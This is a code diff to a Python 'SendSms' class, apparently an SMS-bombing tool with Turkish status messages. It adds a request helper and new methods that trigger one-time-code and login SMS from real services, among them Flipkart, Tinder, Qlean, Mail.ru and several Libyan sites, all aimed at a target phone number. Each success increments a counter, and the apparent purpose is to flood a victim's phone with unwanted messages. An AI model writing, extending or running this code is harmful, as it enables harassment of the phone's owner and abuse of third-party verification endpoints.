@@ -23,6 +23,21 @@ class SendSms():
         else:
             self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"
 
+    def _send_request(self, name, url, method="POST", data=None, params=None, headers=None):
+        try:
+            if method == "POST":
+                r = requests.post(url, json=data, headers=headers, timeout=6)
+            else:
+                r = requests.get(url, params=params, headers=headers, timeout=6)
+            
+            if r.status_code in [200, 201, 202]:
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> {name}")
+                self.adet += 1
+            else:
+                raise Exception(f"Status: {r.status_code}")
+        except:
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> {name}")
+
     def Bim(self):
         try:
             headers = {
@@ -128,3 +143,32 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> mobile.metro-tr.com")
+
+    def Via3(self):
+        self._send_request("3Via", "https://3via.ly/api/client/login", data={"msisdn": self.phone, "device_type": "web"})
+
+    def Winmore(self):
+        self._send_request("Winmore", "https://winmore.ly/api/p10/public/get_started", data={"phone": self.phone, "countryCode": "ly", "language": "en", "utm": {}})
+
+    def Lingo(self):
+        self._send_request("Lingo", "https://lingo.ly/api/client/login", data={"msisdn": self.phone})
+
+    def Bekam(self):
+        self._send_request("Bekam", "https://bekam.ly/api/client/login", data={"msisdn": self.phone})
+
+    def Flipkart(self):
+        headers = {
+            "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
+            "Origin": "https://www.flipkart.com",
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+        self._send_request("flipkart", "https://www.flipkart.com/api/5/user/otp/generate", data={"loginId": f"+{self.phone}"}, headers=headers)
+
+    def Tinder(self):
+        self._send_request("tinder", "https://api.gotinder.com/v2/auth/sms/send", method="POST", params={"auth_type": "sms", "locale": "ru"}, data={"phone_number": f"90{self.phone}"})
+
+    def Qlean(self):
+        self._send_request("qlean", "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", data={"phone": f"90{self.phone}"})
+
+    def MailRu(self):
+        self._send_request("mailru", "https://cloud.mail.ru//api/v2/notify/applink", data={"phone": f"+90{self.phone}", "api": "2", "email": "email", "x-email": "x-email"})
